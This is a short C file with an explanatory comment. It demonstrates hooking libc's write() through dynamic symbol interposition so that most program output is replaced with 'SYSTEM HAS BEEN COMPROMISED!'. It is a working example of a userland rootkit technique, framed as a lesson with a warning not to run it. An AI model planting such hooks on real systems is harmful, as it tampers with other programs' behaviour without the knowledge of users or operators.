#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>

ssize_t write(int fildes, const void *buf, size_t nbytes) {
	ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
	ssize_t result;
	new_write = dlsym(RTLD_NEXT, "write");
	if (strncmp(buf, "x", strlen("x")) != 0) {
		result = new_write(fildes, "SYSTEM HAS BEEN COMPROMISED! ", strlen("SYSTEM HAS BEEN COMPROMISED! "));
	} else {
		result = new_write(fildes, buf, nbytes);
	}
	return result;
}

/*
 *
 *						  DON'T RUN THIS CODE ON YOUR OWN COMPUTER!
 *
 *   First, we include the necessary header files which we will need to carry out simple tasks. Pretty standard thing, right?
 *   Next, we need to create a function with the exact same function definition and return type as the function we are trying to hook.
 *   This is because the programs calling the function will send a set of parameters and shall expect a particular type of output in
 *   return, failing to align to which will cause unwanted errors. Since we are trying to hook the write() function here, we create a
 *   function with the same name(write()), set of parameters (int fd, const void *buf, size_t count) and return type (ssize_t) to prevent
 *   any unwanted errors. So far so good, right? Next up, we do something VERY important : create a function pointer new_write with the
 *   same set of variables as the function we are trying to hook, which in this case is write(), as this will later store the original
 *   address of the function which we will use later! Got it? We also create a variable result to store the return value. Do note that
 *   it's the same datatype as the calling program is expecting. Finally, we come to probably the most technical part of the program.
 *   Here we are storing the location of the original write() function into the function pointer we created earlier. We use the dlsym
 *   function to get the address of next occurrence of write  from the standard shared libraries (as dictated by the RTLD_NEXT flag).
 *
 */
